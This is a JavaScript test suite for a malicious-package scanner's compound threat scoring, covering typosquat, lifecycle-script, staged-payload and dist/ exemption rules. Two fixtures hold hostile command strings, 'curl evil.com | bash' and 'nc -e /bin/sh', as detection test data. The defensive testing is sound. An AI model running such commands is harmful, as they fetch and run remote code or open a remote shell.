'use strict';

const { test, assert } = require('../test-utils');
const { applyFPReductions, applyCompoundBoosts } = require('../../src/scoring.js');
const { getRule } = require('../../src/rules/index.js');
const { getPlaybook } = require('../../src/response/playbooks.js');

async function runCompoundScoringTests() {
  console.log('\n=== COMPOUND SCORING TESTS (v2.9.2) ===\n');

  // ===================================================================
  // 1. crypto_staged_payload — staged_binary_payload + crypto_decipher
  // ===================================================================
  test('Compound: crypto_staged_payload — positive (both types present)', () => {
    const threats = [
      { type: 'staged_binary_payload', severity: 'HIGH', file: 'index.js', message: 'Binary ref + eval' },
      { type: 'crypto_decipher', severity: 'HIGH', file: 'index.js', message: 'createDecipher' }
    ];
    applyCompoundBoosts(threats);
    const compound = threats.find(t => t.type === 'crypto_staged_payload');
    assert(compound, 'crypto_staged_payload compound should be added');
    assert(compound.severity === 'CRITICAL', `Should be CRITICAL, got ${compound.severity}`);
    assert(compound.compound === true, 'Should have compound flag');
    assert(compound.file === 'index.js', `File should be index.js, got ${compound.file}`);
  });

  test('Compound: crypto_staged_payload — negative (only staged_binary_payload)', () => {
    const threats = [
      { type: 'staged_binary_payload', severity: 'HIGH', file: 'index.js', message: 'Binary ref + eval' }
    ];
    applyCompoundBoosts(threats);
    const compound = threats.find(t => t.type === 'crypto_staged_payload');
    assert(!compound, 'Should NOT add compound with only one required type');
  });

  test('Compound: crypto_staged_payload — negative (only crypto_decipher)', () => {
    const threats = [
      { type: 'crypto_decipher', severity: 'HIGH', file: 'lib.js', message: 'createDecipher' }
    ];
    applyCompoundBoosts(threats);
    const compound = threats.find(t => t.type === 'crypto_staged_payload');
    assert(!compound, 'Should NOT add compound with only one required type');
  });

  test('Compound: crypto_staged_payload — no duplicate', () => {
    const threats = [
      { type: 'staged_binary_payload', severity: 'HIGH', file: 'index.js', message: 'Binary ref' },
      { type: 'crypto_decipher', severity: 'HIGH', file: 'index.js', message: 'createDecipher' },
      { type: 'crypto_staged_payload', severity: 'CRITICAL', file: 'index.js', message: 'Already present' }
    ];
    applyCompoundBoosts(threats);
    const compounds = threats.filter(t => t.type === 'crypto_staged_payload');
    assert(compounds.length === 1, `Should not duplicate — got ${compounds.length}`);
  });

  // ===================================================================
  // 2. lifecycle_typosquat — lifecycle_script + typosquat_detected
  // ===================================================================
  test('Compound: lifecycle_typosquat — positive', () => {
    const threats = [
      { type: 'lifecycle_script', severity: 'MEDIUM', file: 'package.json', message: 'preinstall' },
      { type: 'typosquat_detected', severity: 'HIGH', file: 'package.json', message: 'lodash vs lodashs' }
    ];
    applyCompoundBoosts(threats);
    const compound = threats.find(t => t.type === 'lifecycle_typosquat');
    assert(compound, 'lifecycle_typosquat compound should be added');
    assert(compound.severity === 'CRITICAL', `Should be CRITICAL, got ${compound.severity}`);
    assert(compound.file === 'package.json', `File should come from typosquat_detected`);
  });

  test('Compound: lifecycle_typosquat — negative (only lifecycle_script)', () => {
    const threats = [
      { type: 'lifecycle_script', severity: 'MEDIUM', file: 'package.json', message: 'preinstall' }
    ];
    applyCompoundBoosts(threats);
    const compound = threats.find(t => t.type === 'lifecycle_typosquat');
    assert(!compound, 'Should NOT add compound with only lifecycle_script');
  });

  test('Compound: lifecycle_typosquat — negative (only typosquat_detected)', () => {
    const threats = [
      { type: 'typosquat_detected', severity: 'HIGH', file: 'package.json', message: 'lodash vs lodashs' }
    ];
    applyCompoundBoosts(threats);
    const compound = threats.find(t => t.type === 'lifecycle_typosquat');
    assert(!compound, 'Should NOT add compound with only typosquat_detected');
  });

  // ===================================================================
  // 3. lifecycle_inline_exec — lifecycle_script + node_inline_exec
  // ===================================================================
  test('Compound: lifecycle_inline_exec — positive', () => {
    const threats = [
      { type: 'lifecycle_script', severity: 'MEDIUM', file: 'package.json', message: 'postinstall' },
      { type: 'node_inline_exec', severity: 'HIGH', file: 'package.json', message: 'node -e' }
    ];
    applyCompoundBoosts(threats);
    const compound = threats.find(t => t.type === 'lifecycle_inline_exec');
    assert(compound, 'lifecycle_inline_exec compound should be added');
    assert(compound.severity === 'CRITICAL', `Should be CRITICAL, got ${compound.severity}`);
    assert(compound.file === 'package.json', `File should come from node_inline_exec`);
  });

  test('Compound: lifecycle_inline_exec — negative (only lifecycle_script)', () => {
    const threats = [
      { type: 'lifecycle_script', severity: 'MEDIUM', file: 'package.json', message: 'postinstall' }
    ];
    applyCompoundBoosts(threats);
    const compound = threats.find(t => t.type === 'lifecycle_inline_exec');
    assert(!compound, 'Should NOT add compound with only lifecycle_script');
  });

  // ===================================================================
  // 4. lifecycle_remote_require — lifecycle_script + network_require
  // ===================================================================
  test('Compound: lifecycle_remote_require — positive', () => {
    const threats = [
      { type: 'lifecycle_script', severity: 'MEDIUM', file: 'package.json', message: 'preinstall' },
      { type: 'network_require', severity: 'HIGH', file: 'package.json', message: 'require(https)' }
    ];
    applyCompoundBoosts(threats);
    const compound = threats.find(t => t.type === 'lifecycle_remote_require');
    assert(compound, 'lifecycle_remote_require compound should be added');
    assert(compound.severity === 'CRITICAL', `Should be CRITICAL, got ${compound.severity}`);
    assert(compound.file === 'package.json', `File should come from network_require`);
  });

  test('Compound: lifecycle_remote_require — negative (only network_require)', () => {
    const threats = [
      { type: 'network_require', severity: 'HIGH', file: 'package.json', message: 'require(https)' }
    ];
    applyCompoundBoosts(threats);
    const compound = threats.find(t => t.type === 'lifecycle_remote_require');
    assert(!compound, 'Should NOT add compound with only network_require');
  });

  // ===================================================================
  // Disabled compounds — verify they do NOT fire
  // ===================================================================
  test('Disabled: credential_env_exfil does NOT fire (too noisy)', () => {
    const threats = [
      { type: 'credential_tampering', severity: 'CRITICAL', file: 'steal.js', message: 'write to _cacache' },
      { type: 'env_access', severity: 'HIGH', file: 'config.js', message: 'NPM_TOKEN' }
    ];
    applyCompoundBoosts(threats);
    const compound = threats.find(t => t.type === 'credential_env_exfil');
    assert(!compound, 'credential_env_exfil should be disabled — fires on legitimate SDKs');
  });

  test('Disabled: obfuscated_credential_tampering does NOT fire (too noisy)', () => {
    const threats = [
      { type: 'credential_tampering', severity: 'CRITICAL', file: 'payload.js', message: 'write to _cacache' },
      { type: 'obfuscation_detected', severity: 'HIGH', file: 'payload.js', message: 'obfuscated code' }
    ];
    applyCompoundBoosts(threats);
    const compound = threats.find(t => t.type === 'obfuscated_credential_tampering');
    assert(!compound, 'obfuscated_credential_tampering should be disabled — fires on minified SDKs');
  });

  // ===================================================================
  // Same-file constraint for crypto_staged_payload
  // ===================================================================
  test('Compound: crypto_staged_payload — cross-file does NOT fire (sameFile constraint)', () => {
    const threats = [
      { type: 'staged_binary_payload', severity: 'HIGH', file: 'dist/compiled/nft/index.js', message: 'Binary ref' },
      { type: 'crypto_decipher', severity: 'HIGH', file: 'lib/crypto.js', message: 'createDecipher' }
    ];
    applyCompoundBoosts(threats);
    const compound = threats.find(t => t.type === 'crypto_staged_payload');
    assert(!compound, 'crypto_staged_payload should NOT fire when types are in different files');
  });

  test('Compound: crypto_staged_payload — same file fires (sameFile constraint)', () => {
    const threats = [
      { type: 'staged_binary_payload', severity: 'HIGH', file: 'index.js', message: 'Binary ref' },
      { type: 'crypto_decipher', severity: 'HIGH', file: 'index.js', message: 'createDecipher' }
    ];
    applyCompoundBoosts(threats);
    const compound = threats.find(t => t.type === 'crypto_staged_payload');
    assert(compound, 'crypto_staged_payload should fire when both types are in the same file');
    assert(compound.severity === 'CRITICAL', `Should be CRITICAL, got ${compound.severity}`);
  });

  // ===================================================================
  // File assignment tests
  // ===================================================================
  test('Compound: file assignment uses fileFrom component', () => {
    const threats = [
      { type: 'staged_binary_payload', severity: 'HIGH', file: 'src/main.js', message: 'Binary ref' },
      { type: 'crypto_decipher', severity: 'HIGH', file: 'src/main.js', message: 'createDecipher' }
    ];
    applyCompoundBoosts(threats);
    const compound = threats.find(t => t.type === 'crypto_staged_payload');
    assert(compound, 'Should add compound');
    assert(compound.file === 'src/main.js', `Should use staged_binary_payload file, got ${compound.file}`);
  });

  // ===================================================================
  // Multiple compounds from same threat types
  // ===================================================================
  test('Compound: multiple compounds can fire from shared types', () => {
    const threats = [
      { type: 'lifecycle_script', severity: 'MEDIUM', file: 'package.json', message: 'preinstall' },
      { type: 'typosquat_detected', severity: 'HIGH', file: 'package.json', message: 'lodash vs lodashs' },
      { type: 'node_inline_exec', severity: 'HIGH', file: 'package.json', message: 'node -e' },
      { type: 'network_require', severity: 'HIGH', file: 'package.json', message: 'require(https)' }
    ];
    applyCompoundBoosts(threats);
    const typosquat = threats.find(t => t.type === 'lifecycle_typosquat');
    const inlineExec = threats.find(t => t.type === 'lifecycle_inline_exec');
    const remoteReq = threats.find(t => t.type === 'lifecycle_remote_require');
    assert(typosquat, 'lifecycle_typosquat should fire');
    assert(inlineExec, 'lifecycle_inline_exec should fire');
    assert(remoteReq, 'lifecycle_remote_require should fire');
  });

  // ===================================================================
  // Empty threats array
  // ===================================================================
  test('Compound: empty threats array — no crash', () => {
    const threats = [];
    applyCompoundBoosts(threats);
    assert(threats.length === 0, 'Should stay empty');
  });

  // ===================================================================
  // No matching compounds
  // ===================================================================
  test('Compound: unrelated threats — no compounds added', () => {
    const threats = [
      { type: 'dynamic_require', severity: 'HIGH', file: 'a.js', message: 'require concat' },
      { type: 'high_entropy_string', severity: 'MEDIUM', file: 'b.js', message: 'entropy' }
    ];
    const originalLength = threats.length;
    applyCompoundBoosts(threats);
    assert(threats.length === originalLength, `Should not add compounds, got ${threats.length - originalLength} extra`);
  });

  // ===================================================================
  // dangerous_exec in dist/ stays exempt (not downgraded)
  // ===================================================================
  test('DIST_EXEMPT: dangerous_exec in dist/ file stays CRITICAL', () => {
    const threats = [
      { type: 'dangerous_exec', severity: 'CRITICAL', file: 'dist/index.js', message: 'curl evil.com | bash' }
    ];
    applyFPReductions(threats, null, null);
    assert(threats[0].severity === 'CRITICAL', `dangerous_exec in dist/ should stay CRITICAL, got ${threats[0].severity}`);
  });

  test('DIST_EXEMPT: dangerous_exec in build/ file stays CRITICAL', () => {
    const threats = [
      { type: 'dangerous_exec', severity: 'CRITICAL', file: 'build/bundle.js', message: 'nc -e /bin/sh' }
    ];
    applyFPReductions(threats, null, null);
    assert(threats[0].severity === 'CRITICAL', `dangerous_exec in build/ should stay CRITICAL, got ${threats[0].severity}`);
  });

  // ===================================================================
  // Compound types in dist/ — components downgraded to LOW by DIST_BUNDLER_ARTIFACT_TYPES
  // ===================================================================
  test('DIST_BUNDLER: crypto_staged_payload fires in dist/ (originalSeverity gate, v2.9.6)', () => {
    const threats = [
      { type: 'staged_binary_payload', severity: 'HIGH', file: 'dist/main.js', message: 'Binary ref' },
      { type: 'crypto_decipher', severity: 'HIGH', file: 'dist/main.js', message: 'createDecipher' }
    ];
    applyFPReductions(threats, null, null);
    // After FP reductions, both are LOW (two-notch downgrade in dist/)
    assert(threats[0].severity === 'LOW', `staged_binary_payload should be LOW in dist/, got ${threats[0].severity}`);
    assert(threats[1].severity === 'LOW', `crypto_decipher should be LOW in dist/, got ${threats[1].severity}`);
    // But originalSeverity is still HIGH (set before FP reductions)
    assert(threats[0].originalSeverity === 'HIGH', `originalSeverity should be HIGH, got ${threats[0].originalSeverity}`);
    applyCompoundBoosts(threats);
    const compound = threats.find(t => t.type === 'crypto_staged_payload');
    // v2.9.6: compound NOW fires — originalSeverity gate prevents attackers from
    // placing code in dist/ to evade compound detection (GAP 4b hardening).
    assert(compound, 'crypto_staged_payload should fire — originalSeverity was HIGH');
    assert(compound.severity === 'CRITICAL', `Should be CRITICAL, got ${compound.severity}`);
  });

  test('DIST_BUNDLER: crypto_staged_payload fires at root (components stay HIGH)', () => {
    const threats = [
      { type: 'staged_binary_payload', severity: 'HIGH', file: 'index.js', message: 'Binary ref' },
      { type: 'crypto_decipher', severity: 'HIGH', file: 'index.js', message: 'createDecipher' }
    ];
    applyFPReductions(threats, null, null);
    applyCompoundBoosts(threats);
    const compound = threats.find(t => t.type === 'crypto_staged_payload');
    assert(compound, 'crypto_staged_payload should fire at root (not in dist/)');
    assert(compound.severity === 'CRITICAL', `Should be CRITICAL, got ${compound.severity}`);
  });

  // ===================================================================
  // Rules and playbooks exist for all 4 active compound types
  // ===================================================================
  test('Rules: all 4 active compound rules exist with correct IDs', () => {
    const compoundTypes = [
      'crypto_staged_payload', 'lifecycle_typosquat',
      'lifecycle_inline_exec', 'lifecycle_remote_require'
    ];
    for (const type of compoundTypes) {
      const rule = getRule(type);
      assert(rule.id !== 'MUADDIB-UNK-001', `Rule for ${type} should exist, got unknown`);
      assert(rule.id.startsWith('MUADDIB-COMPOUND-'), `Rule ID for ${type} should start with MUADDIB-COMPOUND-, got ${rule.id}`);
      assert(rule.severity === 'CRITICAL', `Rule severity for ${type} should be CRITICAL, got ${rule.severity}`);
      assert(rule.confidence === 'high', `Rule confidence for ${type} should be high, got ${rule.confidence}`);
    }
  });

  test('Playbooks: all 4 active compound playbooks exist', () => {
    const compoundTypes = [
      'crypto_staged_payload', 'lifecycle_typosquat',
      'lifecycle_inline_exec', 'lifecycle_remote_require'
    ];
    for (const type of compoundTypes) {
      const playbook = getPlaybook(type);
      assert(playbook !== 'Analyser manuellement cette menace.',
        `Playbook for ${type} should exist, got default`);
      assert(playbook.includes('CRITIQUE'), `Playbook for ${type} should contain CRITIQUE`);
    }
  });

  // ===================================================================
  // Severity gate: compound blocked when ALL components are LOW
  // ===================================================================
  test('Severity gate: crypto_staged_payload blocked when both LOW', () => {
    const threats = [
      { type: 'staged_binary_payload', severity: 'LOW', file: 'a.js', message: 'bin' },
      { type: 'crypto_decipher', severity: 'LOW', file: 'a.js', message: 'decipher' }
    ];
    applyCompoundBoosts(threats);
    const compound = threats.find(t => t.type === 'crypto_staged_payload');
    assert(!compound, 'Should NOT fire when all components are LOW');
  });

  test('Severity gate: fires when one component is MEDIUM and other is LOW', () => {
    const threats = [
      { type: 'staged_binary_payload', severity: 'LOW', file: 'a.js', message: 'bin' },
      { type: 'crypto_decipher', severity: 'MEDIUM', file: 'a.js', message: 'decipher' }
    ];
    applyCompoundBoosts(threats);
    const compound = threats.find(t => t.type === 'crypto_staged_payload');
    assert(compound, 'Should fire when at least one component is >= MEDIUM');
    assert(compound.severity === 'CRITICAL', `Should be CRITICAL, got ${compound.severity}`);
  });

  test('Severity gate: lifecycle compounds pass (lifecycle_script MEDIUM counts)', () => {
    const threats = [
      { type: 'lifecycle_script', severity: 'MEDIUM', file: 'package.json', message: 'preinstall' },
      { type: 'typosquat_detected', severity: 'LOW', file: 'package.json', message: 'typo' }
    ];
    applyCompoundBoosts(threats);
    const compound = threats.find(t => t.type === 'lifecycle_typosquat');
    assert(compound, 'lifecycle_typosquat should fire because lifecycle_script is MEDIUM');
  });

  // ===================================================================
  // Compound count field
  // ===================================================================
  test('Compound: injected threats have count=1', () => {
    const threats = [
      { type: 'lifecycle_script', severity: 'MEDIUM', file: 'package.json', message: 'preinstall' },
      { type: 'typosquat_detected', severity: 'HIGH', file: 'package.json', message: 'typo' }
    ];
    applyCompoundBoosts(threats);
    const compound = threats.find(t => t.type === 'lifecycle_typosquat');
    assert(compound.count === 1, `Count should be 1, got ${compound.count}`);
  });
}

module.exports = { runCompoundScoringTests };
